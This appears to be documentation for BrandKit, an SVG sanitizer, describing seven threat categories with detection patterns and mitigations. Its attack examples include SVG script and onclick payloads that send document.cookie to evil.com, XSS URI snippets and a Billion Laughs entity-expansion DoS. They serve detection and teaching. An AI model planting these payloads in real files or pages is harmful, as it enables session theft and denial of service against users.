# Threat Types

BrandKit detects 7 categories of security threats in SVG files.

## Scripts

**Severity: Critical**

Script elements enable arbitrary JavaScript execution, the most dangerous SVG threat.

### Detection Patterns

| Pattern | Example |
|---------|---------|
| Script elements | `<script>alert('XSS')</script>` |
| Self-closing scripts | `<script src="evil.js"/>` |
| JavaScript URIs | `href="javascript:alert(1)"` |
| VBScript URIs | `href="vbscript:msgbox(1)"` |
| Data HTML URIs | `href="data:text/html,<script>..."` |

### Attack Example

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    document.location = 'https://evil.com/steal?cookie=' + document.cookie;
  </script>
  <rect width="100" height="100" fill="blue"/>
</svg>
```

### Mitigation

- Remove all `<script>` elements
- Strip `javascript:`, `vbscript:`, and `data:text/html` URIs

## Event Handlers

**Severity: Critical**

Event handler attributes execute JavaScript when users interact with the SVG.

### Detection Patterns

| Attribute | Trigger |
|-----------|---------|
| `onclick` | Mouse click |
| `onload` | Element loads |
| `onerror` | Error occurs |
| `onmouseover` | Mouse hover |
| `onfocus` | Element focused |
| `onmouseenter` | Mouse enters |

All `on*` attributes are detected.

### Attack Example

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="blue"
        onclick="fetch('https://evil.com/log?data=' + document.cookie)"/>
</svg>
```

### Mitigation

- Remove all `on*` attributes
- BrandKit handles quoted and unquoted values

## External References

**Severity: High**

External references can load remote content, enabling tracking and data exfiltration.

### Detection Patterns

| Pattern | Example |
|---------|---------|
| External href | `href="https://evil.com/track.svg"` |
| External xlink:href | `xlink:href="https://evil.com/image.png"` |
| foreignObject | `<foreignObject>` elements |
| URL in styles | `style="background: url(https://...)"` |
| External use refs | `<use href="https://evil.com/defs.svg#icon"/>` |

### Attack Example

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="https://tracker.com/pixel.gif?user=123"/>
  <rect width="100" height="100" fill="blue"/>
</svg>
```

### Mitigation

- Remove external URLs (http://, https://)
- Remove `<foreignObject>` elements
- Keep internal references (`#id`)

## XML Entities

**Severity: High**

XML entity declarations can enable XXE (XML External Entity) attacks and denial of service.

### Detection Patterns

| Pattern | Risk |
|---------|------|
| `<!DOCTYPE>` | Can reference external DTDs |
| `<!ENTITY>` | Can define recursive or external entities |

### Attack Example (Billion Laughs DoS)

```xml
<!DOCTYPE svg [
  <!ENTITY x "AAAAAAAAAA">
  <!ENTITY x2 "&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;">
  <!ENTITY x3 "&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&x3;</text>
</svg>
```

### Mitigation

- Remove DOCTYPE declarations
- Remove ENTITY declarations

## Animation

**Severity: Medium**

Animation elements can trigger actions over time, potentially executing delayed attacks.

### Detection Patterns

| Element | Purpose |
|---------|---------|
| `<animate>` | Animates attributes |
| `<animateTransform>` | Animates transforms |
| `<animateMotion>` | Animates along path |
| `<animateColor>` | Animates colors |
| `<set>` | Sets values at time |

### Risk

- Delayed execution of malicious behavior
- UI manipulation to deceive users
- Unexpected behavior in static contexts

### Mitigation

- Remove animation elements for static images
- Only detected in strict mode

## Links

**Severity: Medium**

Anchor elements can navigate users away from your site, enabling phishing.

### Detection Patterns

| Pattern | Example |
|---------|---------|
| Anchor with href | `<a href="https://phishing.com">` |

### Risk

- Unexpected navigation
- Phishing attacks
- Social engineering

### Mitigation

- Remove `<a>` elements for static images
- Only detected in strict mode

## Style Blocks

**Severity: Low**

Style blocks can contain CSS that manipulates the UI or exfiltrates data.

### Detection Patterns

| Element | Risk |
|---------|------|
| `<style>` | CSS injection |

### Risk

- UI manipulation via CSS
- CSS-based data exfiltration (font loading, etc.)
- Usually benign (CSS classes for styling)

### Mitigation

- Remove `<style>` elements or inline styles
- Only detected in strict mode
- Often acceptable in controlled environments
